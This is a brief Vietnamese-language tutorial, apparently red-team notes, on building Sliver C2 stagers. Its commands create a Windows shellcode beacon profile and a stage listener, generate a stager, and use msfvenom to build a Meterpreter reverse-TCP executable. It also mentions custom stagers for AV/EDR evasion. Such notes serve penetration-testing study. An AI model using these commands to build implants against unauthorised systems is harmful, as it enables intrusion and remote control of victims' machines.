# Sliver - Stager

## Stager là gì

- **Stager** là payload nhỏ gọn, dùng để tải và thực thi payload chính (stage payload) từ server C2
- **Giảm kích thước payload ban đầu**, tăng khả năng deliver đến người dùng
- **Linh hoạt tải qua nhiều giao thức khác nhau:** HTTP, HTTPS, DNS, SMB, TCP...

## Triển khai stager

### Tạo Profile


```bash
sliver > stage-listener --url http://<IP>:<PORT> --profile <profile-name>
```

#### Profile mTLS cho implant beacon 64-bit Windows

```bash
sliver > profiles new beacon --mtls <c2_server> --format shellcode --arch amd64 --os windows win64
```

### Tạo stager listener

```bash
sliver > stage-listener --url tcp://<c2_host>:<c2_port> --profile <profile_name>
```

### Tạo stager

Sliver cho phép ta tạo stager từ nhiều nguồn khác nhau

### Sliver Framework

```bash
sliver > generate stager --lhost <c2_host> --lport <c2_port>
```

### Metasploit

```bash
msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=<c2_host> LPORT=<c2_port> EXITFUNC=thread --format exe -o stager.exe
```

### Custom Stager

Và để tối ưu nhất cho từng môi trường cụ thể Sliver cũng cho phép viết custom stager để tối ưu AV/EDR evasion


## References

- **[Custom Powershell Stager](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8):** Blog produce một custom powershell stager